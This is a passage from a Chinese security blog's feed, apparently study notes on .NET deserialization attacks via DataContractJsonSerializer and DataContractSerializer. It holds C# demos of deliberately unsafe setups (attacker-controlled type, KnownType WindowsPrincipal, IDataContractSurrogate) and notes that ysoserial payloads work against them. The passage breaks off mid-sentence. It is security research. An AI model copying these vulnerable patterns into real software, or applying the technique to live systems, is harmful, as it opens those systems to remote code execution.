class="meta">KnownType(typeof(WindowsPrincipal))</span>]</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">int</span> age;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="built_in">object</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            <span class="keyword">using</span> (FileStream file = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.json&quot;</span>, FileMode.OpenOrCreate))</span><br><span class="line">            &#123;</span><br><span class="line">                ser.ReadObject(file);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数中传入KnownType"><a href="#构造函数中传入KnownType" class="headerlink" title="构造函数中传入KnownType"></a>构造函数中传入KnownType</h3><p>这个相比于第二种的话  是更好利用的 因为这个是可以通过构造函数来进行利用的</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">string</span> name;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">int</span> age;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="built_in">object</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> settings = <span class="keyword">new</span> DataContractJsonSerializerSettings();</span><br><span class="line">            settings.EmitTypeInformation = EmitTypeInformation.Always;</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person), <span class="keyword">new</span> List&lt;Type&gt; &#123; <span class="keyword">typeof</span>(WindowsPrincipal) &#125;);</span><br><span class="line">            <span class="keyword">using</span> (FileStream file = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.json&quot;</span>, FileMode.OpenOrCreate))</span><br><span class="line">            &#123;</span><br><span class="line">                ser.ReadObject(file);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240313104043879.png" alt="image-20240313104043879"></p><p><img src="../images/image-20240313104032117.png" alt="image-20240313104032117"></p><p>控制这个KnownType的话  就是Type可以是任意类了   必须是标记<code>[DataContract]</code>特性的类</p><p>以上的三种方法在用yso生成的payload的时候都能利用</p><p>除了上文三种方法外，再引入一个新的东西IDataContractSurrogate 接口</p><h2 id="IDataContractSurrogate"><a href="#IDataContractSurrogate" class="headerlink" title="IDataContractSurrogate"></a>IDataContractSurrogate</h2><p><img src="../images/image-20240313105413243.png" alt="image-20240313105413243"></p><p>参数解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// 摘要:</span><br><span class="line">//     初始化 System.Runtime.Serialization.Json.DataContractJsonSerializer 类的新实例，以便序列化或反序列化指定类型的对象。</span><br><span class="line">//     此方法还指定了可在对象图中呈现的已知类型的列表、要序列化或反序列化的最大图项数、是忽略意外数据还是发出类型信息以及自定义序列化的代理项。</span><br><span class="line">//</span><br><span class="line">// 参数:</span><br><span class="line">//   type:</span><br><span class="line">//     序列化或反序列化的实例的类型。</span><br><span class="line">//</span><br><span class="line">//   knownTypes:</span><br><span class="line">//     一个包含内容的根元素名称的 System.Xml.XmlDictionaryString。</span><br><span class="line">//</span><br><span class="line">//   maxItemsInObjectGraph:</span><br><span class="line">//     System.Collections.Generic.IEnumerable`1 的一个 System.Type，其中包含可在对象图中呈现的类型。</span><br><span class="line">//</span><br><span class="line">//   ignoreExtensionDataObject:</span><br><span class="line">//     若要在序列化时忽略 true 接口并在反序列化时忽略意外数据，则为 System.Runtime.Serialization.IExtensibleDataObject；否则为</span><br><span class="line">//     false。 默认值为 false。</span><br><span class="line">//</span><br><span class="line">//   dataContractSurrogate:</span><br><span class="line">//     一个用于自定义序列化过程的 System.Runtime.Serialization.IDataContractSurrogate 实现。</span><br><span class="line">//</span><br><span class="line">//   alwaysEmitTypeInformation:</span><br><span class="line">//     若要发出类型信息，则为 true；否则为 false。 默认值为 false。</span><br><span class="line">public DataContractJsonSerializer(Type type, IEnumerable&lt;Type&gt; knownTypes, int maxItemsInObjectGraph, bool ignoreExtensionDataObject, IDataContractSurrogate dataContractSurrogate, bool alwaysEmitTypeInformation);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中提到了dataContractSurrogate参数，用于自定义序列化过程的 System.Runtime.Serialization.IDataContractSurrogate 实现。</p><p><strong>因为DataContractJsonSerializer只有已知类型knownTypes的对象才能被序列化，而在实体类中不可避免的需要接入其他没有被标记DataContract特性的类，而没标记DataContract特性，就不在konwnTypes中，就不能被序列化。所以引入IDataContractSurrogate接口，作用是控制实体类引入了不在knownTypes中的类型实例应该如何被序列化存储。</strong></p><p>这里就和上文的那个WindowsPrincipal类的KnownType对应了</p><p>所以要是就是Type值设置为需要反序列化的类  要么就是KnowType设置  这两个其中一个设置就行</p><p><strong>(如果两者都不设置的话  就选下面的这个IDataContractSurrogate接口)</strong></p><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.CodeDom;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Collections.ObjectModel;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">public</span> Dog dog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Dog</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">DogSurrogated</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember()</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> xmlData;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">DogSurrogate</span> : <span class="title">IDataContractSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">GetCustomDataToExport</span>(<span class="params">MemberInfo memberInfo, Type dataContractType</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetCustomDataToExport invoked&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">GetCustomDataToExport</span>(<span class="params">Type clrType, Type dataContractType</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetCustomDataToExport invoked&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Type <span class="title">GetDataContractType</span>(<span class="params">Type type</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;GetDataContractType invoked, <span class="subst">&#123;type&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (type.IsAssignableFrom(<span class="keyword">typeof</span>(Dog)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">typeof</span>(DogSurrogated);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> type;  </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">GetDeserializedObject</span>(<span class="params"><span class="built_in">object</span> obj, Type targetType</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;GetDeserializedObject invoked <span class="subst">&#123;obj&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">is</span> DogSurrogated)</span><br><span class="line">            &#123;</span><br><span class="line">                DogSurrogated ps = (DogSurrogated)obj;</span><br><span class="line">                XmlSerializer xs = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(Dog));</span><br><span class="line">                <span class="keyword">return</span> (Dog)xs.Deserialize(<span class="keyword">new</span> StringReader(ps.xmlData));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetKnownCustomDataTypes</span>(<span class="params">Collection&lt;Type&gt; customDataTypes</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;GetKnownCustomDataTypes invoked. <span class="subst">&#123;customDataTypes&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">GetObjectToSerialize</span>(<span class="params"><span class="built_in">object</span> obj, Type targetType</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;GetObjectToSerialize invoked,<span class="subst">&#123;obj&#125;</span>,<span class="subst">&#123;targetType.FullName&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">is</span> Dog)</span><br><span class="line">            &#123;</span><br><span class="line">                DogSurrogated ps = <span class="keyword">new</span> DogSurrogated();</span><br><span class="line">                XmlSerializer xs = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(Dog));</span><br><span class="line">                StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line">                xs.Serialize(sw, (Dog)obj);</span><br><span class="line">                ps.xmlData = sw.ToString();</span><br><span class="line">                <span class="keyword">return</span> ps;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Type <span class="title">GetReferencedTypeOnImport</span>(<span class="params"><span class="built_in">string</span> typeName, <span class="built_in">string</span> typeNamespace, <span class="built_in">object</span> customData</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetReferencedTypeOnImport invoked&quot;</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;\t Type Name: &#123;0&#125;&quot;</span>, typeName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (typeName.Equals(<span class="string">&quot;DogSurrogated&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Returning Dog&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">typeof</span>(Dog);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> CodeTypeDeclaration <span class="title">ProcessImportedType</span>(<span class="params">CodeTypeDeclaration typeDeclaration, CodeCompileUnit compileUnit</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;ProcessImportedType invoked&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> typeDeclaration;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] vs</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">            dog.Name = <span class="string">&quot;jjjj&quot;</span>;</span><br><span class="line">            person.dog = dog;</span><br><span class="line">            List&lt;Type&gt; knownTypes = <span class="keyword">new</span> List&lt;Type&gt;();</span><br><span class="line">            DogSurrogate surrogate = <span class="keyword">new</span> DogSurrogate();</span><br><span class="line">            <span class="comment">//DataContractSerializer surrogateSerializer = new DataContractSerializer(typeof(Person), knownTypes, Int16.MaxValue, false, true, surrogate);</span></span><br><span class="line">            DataContractJsonSerializer dataContractJsonSerializer = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person), knownTypes, <span class="built_in">int</span>.MaxValue, <span class="literal">false</span>, surrogate, <span class="literal">false</span>);</span><br><span class="line">            FileStream fs = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.txt&quot;</span>, FileMode.OpenOrCreate);</span><br><span class="line">            dataContractJsonSerializer.WriteObject(fs, person);</span><br><span class="line">            fs.Close();</span><br><span class="line">            Console.WriteLine(File.ReadAllText(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line">            Person p1 = (Person)dataContractJsonSerializer.ReadObject(File.Open(<span class="string">&quot;1.txt&quot;</span>, FileMode.Open));</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;person.Name:<span class="subst">&#123;p1.Name&#125;</span>\t person.dog.Name:<span class="subst">&#123;p1.dog.Name&#125;</span>&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240313111309274.png" alt="image-20240313111309274"></p><p>这里的话一共是有三个类</p><p>其中Person标记了DataContract，但是其dog字段的类型Dog没有标记DataContract，所以新建了一个DogSurrogated类来表示Dog类型。</p><p>在代码中新建了DogSurrogate类实现IDataContractSurrogate接口方法，并将其传入DataContractJsonSerializer构造函数。</p><p>DogSurrogate在这个类中  实现了序列化和反序列化操作</p><p><img src="../images/image-20240313111639103.png" alt="image-20240313111639103"></p><p><img src="../images/image-20240313111645855.png" alt="image-20240313111645855"></p><p>这里这个接口也是一样  我们可以自己定义需要反序列化的类  在实战中 我们只需要重写这个接口  在里面写上对应的类就行了</p><p><strong>其实对这个IDataContractSurrogate  接口来讲  我认为实战中是有点难进行利用的  应该遇到会很少</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractJsonSerializer.md&quot;&gt;https://github.com/Y4er/dotnet-deseriali</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-08</title>
    <link href="https://ke1nys.github.io/posts/dd27a293.html"/>
    <id>https://ke1nys.github.io/posts/dd27a293.html</id>
    <published>2024-03-11T08:07:32.000Z</published>
    <updated>2024-03-12T14:41:01.020Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractSerializer.md</a></p><h2 id="DataContractSerializer"><a href="#DataContractSerializer" class="headerlink" title="DataContractSerializer"></a>DataContractSerializer</h2><p>其实这个类和<code>xmlSerializer</code>是类似的  都是得控制type变量的值  还有传入的xml的值</p><p>(type的值必须得是序列化的类  不然会反序列化失败)</p><p>其不同的是这个类的序列化和反序列化的是依靠writeobject和readobject类</p><p>给个官方的Demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// You must apply a DataContractAttribute or SerializableAttribute</span></span><br><span class="line">    <span class="comment">// to a class to have it serialized by the DataContractSerializer.</span></span><br><span class="line">    [<span class="meta">DataContract(Name = <span class="string">&quot;Customer&quot;</span>, Namespace = <span class="string">&quot;http://www.contoso.com&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember()</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> FirstName;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> LastName;</span><br><span class="line">        [<span class="meta">DataMember()</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params"><span class="built_in">string</span> newfName, <span class="built_in">string</span> newLName, <span class="built_in">int</span> age</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            FirstName = newfName;</span><br><span class="line">            LastName = newLName;</span><br><span class="line">            Age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                WriteObject(<span class="string">&quot;DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">                ReadObject(<span class="string">&quot;DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">catch</span> (SerializationException serExc)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Serialization Failed&quot;</span>);</span><br><span class="line">                Console.WriteLine(serExc.Message);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception exc)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;The serialization operation failed: &#123;0&#125; StackTrace: &#123;1&#125;&quot;</span>,</span><br><span class="line">                exc.Message, exc.StackTrace);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">finally</span></span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Press &lt;Enter&gt; to exit....&quot;</span>);</span><br><span class="line">                Console.ReadLine();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WriteObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Creating a Person object and serializing it.&quot;</span>);</span><br><span class="line">            Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;bill&quot;</span>, <span class="string">&quot;gates&quot;</span>, <span class="number">100</span>);</span><br><span class="line">            FileStream writer = <span class="keyword">new</span> FileStream(fileName, FileMode.Create);</span><br><span class="line">            DataContractSerializer ser = <span class="keyword">new</span> DataContractSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            ser.WriteObject(writer, p1);</span><br><span class="line">            writer.Close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReadObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Deserializing an instance of the object.&quot;</span>);</span><br><span class="line">            FileStream fs = <span class="keyword">new</span> FileStream(fileName, FileMode.Open);</span><br><span class="line">            XmlDictionaryReader reader = XmlDictionaryReader.CreateTextReader(fs, <span class="keyword">new</span> XmlDictionaryReaderQuotas());</span><br><span class="line">            DataContractSerializer ser = <span class="keyword">new</span> DataContractSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Deserialize the data and read it from the instance.</span></span><br><span class="line">            Person deserializedPerson = (Person)ser.ReadObject(reader, <span class="literal">true</span>);</span><br><span class="line">            reader.Close();</span><br><span class="line">            fs.Close();</span><br><span class="line">            Console.WriteLine(String.Format(<span class="string">&quot;&#123;0&#125; &#123;1&#125;, Age: &#123;2&#125;&quot;</span>, deserializedPerson.FirstName, deserializedPerson.LastName, deserializedPerson.Age));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码关键点在于<code>new 